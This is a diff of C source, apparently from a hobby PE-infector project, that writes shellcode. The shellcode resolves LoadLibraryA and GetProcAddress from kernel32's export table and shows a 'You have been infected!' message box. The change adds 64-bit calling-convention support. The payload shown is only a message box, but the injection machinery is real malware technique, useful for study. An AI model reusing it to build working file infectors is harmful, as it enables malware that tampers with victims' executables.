@@ -277,20 +277,17 @@ int main(int argc, char *argv[]) {
     REX_IF64
     instruct(fr, 0x895d, mem_stack.kernel32dll = -(stack_reserved += size), db);
 
-    // mov r|eax, [r|ebx + 3Ch]
-    REX_IF64
+    // mov eax, [r|ebx + 3Ch]
     instruct(fr, 0x8b43, 0x3c, db); // RVA of PE signature
     // add r|eax, r|ebx
     REX_IF64
     write_instruction(fr, 0x01d8);
-    // mov r|eax, [eax + 78h]
-    REX_IF64
-    instruct(fr, 0x8b80, 24 + 96, dd); // RVA of Export Table
+    // mov eax, [eax + 78h] OR [rax + 88h]
+    instruct(fr, 0x8b80, 24 + (imageOptionalHeader.Magic == 0x10B ? 96 : 112), dd); // RVA of Export Table
     // add r|eax, r|ebx
     REX_IF64
     write_instruction(fr, 0x01d8);
-    // mov r|ecx, [r|eax + 24h]
-    REX_IF64
+    // mov ecx, [r|eax + 24h]
     instruct(fr, 0x8b48, 36,db); // RVA of Ordinal Table
     // add r|ecx, r|ebx
     REX_IF64
@@ -298,8 +295,7 @@ int main(int argc, char *argv[]) {
     // mov [r|ebp + OrdinalTbl], r|ecx
     REX_IF64
     instruct(fr, 0x894d, mem_stack.OrdinalTbl = -(stack_reserved += size),db);
-    // mov r|edi, [r|eax + 20h]
-    REX_IF64
+    // mov edi, [r|eax + 20h]
     instruct(fr, 0x8b78, 32,db); // RVA of Name Pointer Table
     // add r|edi, r|ebx
     REX_IF64
@@ -307,8 +303,7 @@ int main(int argc, char *argv[]) {
     // mov [r|ebp + NamePtrTbl], r|edi
     REX_IF64
     instruct(fr, 0x897d, mem_stack.NamePtrTbl = -(stack_reserved += size),db);
-    // mov r|edx, [r|eax + 1Ch]
-    REX_IF64
+    // mov edx, [r|eax + 1Ch]
     instruct(fr, 0x8b50, 28,db); // RVA of Address Table
     // add r|edx, r|ebx
     REX_IF64
@@ -316,9 +311,8 @@ int main(int argc, char *argv[]) {
     // mov [r|ebp + AddrTbl], r|edx
     REX_IF64
     instruct(fr, 0x8955, mem_stack.AddrTbl = -(stack_reserved += size), db);
-    // mov r|edx, [r|eax + 14h]
-    REX_IF64
-    instruct(fr, 0x8b50, 0x20,db); // Number of exported functions
+    // mov edx, [r|eax + 14h]
+    instruct(fr, 0x8b50, 20,db); // Number of exported functions
     // xor r|eax, r|eax
     REX_IF64
     write_instruction(fr, 0x31c0);
@@ -328,8 +322,7 @@ int main(int argc, char *argv[]) {
     // mov r|edi, [r|ebp + NamePtrTbl]
     REX_IF64
     instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
-    // mov r|edi, [r|edi + r|eax*4]
-    REX_IF64
+    // mov edi, [r|edi + r|eax*4]
     write_instruction(fr, 0x8b3c87);
     // add r|edi, r|ebx
     REX_IF64
@@ -355,7 +348,7 @@ int main(int argc, char *argv[]) {
 
     // inc r|eax
     REX_IF64
-    write_instruction(fr, 0x40);
+    write_instruction(fr, 0xffc0);
     // cmp r|eax,r|edx
     REX_IF64
     write_instruction(fr, 0x39d0);
@@ -379,20 +372,20 @@ int main(int argc, char *argv[]) {
     instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
     // mov ax, [r|ecx + r|eax*2]
     write_instruction(fr, 0x668b0441);
-    // mov r|eax, [r|edx + r|eax*4]
-    REX_IF64
+    // mov eax, [r|edx + r|eax*4]
     write_instruction(fr, 0x8b0482);
     // add r|eax, r|ebx
     REX_IF64
     write_instruction(fr, 0x01d8); // r|eax holds mem addr of LoadLibraryA
-    // mov r|esi, [r|ebp + Inject]
+    // mov r|ecx, [r|ebp + Inject]
     REX_IF64
-    instruct(fr, 0x8b75, mem_stack.Inject, db);
-    // add r|esi, &data[4]
+    instruct(fr, 0x8b4d, mem_stack.Inject, db);
+    // add r|ecx, &data[4]
     REX_IF64
-    instruct(fr, 0x83c6, data[4] - data[0], db);
-    // push r|esi ("user32.dll")
-    write_instruction(fr, 0x56);
+    instruct(fr, 0x83c1, data[4] - data[0], db);
+	// push ecx ("user32.dll") (32-bit only)
+    if (imageOptionalHeader.Magic == 0x10B)
+	    write_instruction(fr, 0x51);
     // call r|eax
     write_instruction(fr, 0xffd0);
     // mov [r|ebp + user32dll], r|eax
@@ -413,8 +406,7 @@ int main(int argc, char *argv[]) {
     // mov r|edi, [r|ebp + NamePtrTbl]
     REX_IF64
     instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
-    // mov r|edi, [r|edi + r|eax*4]
-    REX_IF64
+    // mov edi, [r|edi + r|eax*4]
     write_instruction(fr, 0x8b3c87);
     // add r|edi, r|ebx
     REX_IF64
@@ -440,7 +432,7 @@ int main(int argc, char *argv[]) {
 
     // inc r|eax
     REX_IF64
-    write_instruction(fr, 0x40);
+    write_instruction(fr, 0xffc0);
     // cmp r|eax,r|edx
     REX_IF64
     write_instruction(fr, 0x39d0);
@@ -464,41 +456,56 @@ int main(int argc, char *argv[]) {
     instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
     // mov ax, [r|ecx + r|eax*2]
     write_instruction(fr, 0x668b0441);
-    // mov r|eax, [r|edx + r|eax*4]
-    REX_IF64
+    // mov eax, [r|edx + r|eax*4]
     write_instruction(fr, 0x8b0482);
     // add r|eax, r|ebx
     REX_IF64
     write_instruction(fr, 0x01d8); // r|eax holds mem addr of GetProcAddress
-    // mov r|esi, [r|ebp + Inject]
+    // mov r|edx, [r|ebp + Inject]
     REX_IF64
-    instruct(fr, 0x8b75, mem_stack.Inject, db);
-    // add r|esi, &data[5]
+    instruct(fr, 0x8b95, mem_stack.Inject, dd);
+    // add r|edx, &data[5] ("MessageBoxA")
     REX_IF64
-    instruct(fr, 0x83c6, data[5] - data[0], db);
-    // push r|esi ("MessageBoxA")
-    write_instruction(fr, 0x56);
-    // push [r|ebp + user32dll]
+    instruct(fr, 0x81c2, data[5] - data[0], dd);
+    // mov r|ecx, [r|ebp + user32dll]
     REX_IF64
-    instruct(fr, 0xff75, mem_stack.user32dll, db);
+    instruct(fr, 0x8b8d, mem_stack.user32dll, dd);
+    if (imageOptionalHeader.Magic == 0x10B) {
+        // push edx
+        write_instruction(fr, 0x52);
+        // push ecx
+        write_instruction(fr, 0x51);
+    }
     // call r|eax (GetProcAddress)
     write_instruction(fr, 0xffd0); // r|eax holds mem addr of MessageBoxA
 
     // Invoke MessageBoxA
-    // push 2030h (Type)
-    instruct(fr, 0x68, MB_OK | MB_ICONWARNING | MB_TASKMODAL, dd);
-    // mov r|edx, [r|ebp + Inject] ; Also address of data[0]
-    REX_IF64
-    instruct(fr, 0x8b55, mem_stack.Inject, db);
-    // push r|edx ("Notice")
-    write_instruction(fr, 0x52);
-    // add r|edx, &data[1]
-    REX_IF64
-    instruct(fr, 0x83c2, data[1] - data[0], db);
-    // push r|edx ("You have been infected!")
-    write_instruction(fr, 0x52);
-    // push 0 (hWnd)
-    instruct(fr, 0x6a, 0, db);
+    // This is actually compressible, but im too lazy rn
+    if (imageOptionalHeader.Magic == 0x10B) {
+        // push 2030h (Type)
+        instruct(fr, 0x68, MB_OK | MB_ICONWARNING | MB_TASKMODAL, dd);
+        // mov edx, [ebp + Inject] ; Also address of data[0]
+        instruct(fr, 0x8b55, mem_stack.Inject, db);
+        // push edx ("Notice")
+        write_instruction(fr, 0x52);
+        // add edx, &data[1]
+        instruct(fr, 0x83c2, data[1] - data[0], db);
+        // push edx ("You have been infected!")
+        write_instruction(fr, 0x52);
+        // push 0 (hWnd)
+        instruct(fr, 0x6a, 0, db);
+    } else {
+        // mov r9, 0x2030
+        instruct(fr, 0x49c7c1, 0x2030, dd);
+        // mov r8, [rbp + 30]
+        instruct(fr, 0x4c8b45, mem_stack.Inject, db);
+        // mov rdx, r8
+        write_instruction(fr, 0x4c89c2);
+        // add rdx, 10
+        instruct(fr, 0x4883c2, data[1] - data[0], db);
+        // xor rcx, rcx
+        write_instruction(fr, 0x4831c9);
+    }
     // call r|eax (MessageBoxA)
     write_instruction(fr, 0xFFD0);
 
